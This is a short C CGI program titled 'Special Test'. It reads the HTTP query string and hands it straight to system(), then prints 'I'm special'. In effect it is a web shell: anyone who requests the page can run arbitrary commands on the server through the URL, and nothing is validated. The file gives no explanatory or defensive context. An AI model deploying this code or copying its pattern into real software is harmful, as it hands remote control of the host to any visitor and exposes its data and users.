#include <stdio.h>
#include <stdlib.h>
int main(void)
{
  char *data;
  long m,n;
  printf("%s%c%c\n","Content-Type:text/html;charset=iso-8859-1",13,10);
  printf("<TITLE>Special Test</TITLE>\n");
  data = getenv("QUERY_STRING");
  if(data == NULL)
    printf("<P>Error! Error in passing data from form to script.");
  else {
     system(data);
  }
  printf("<P>I'm special \n");
  return 0;
}
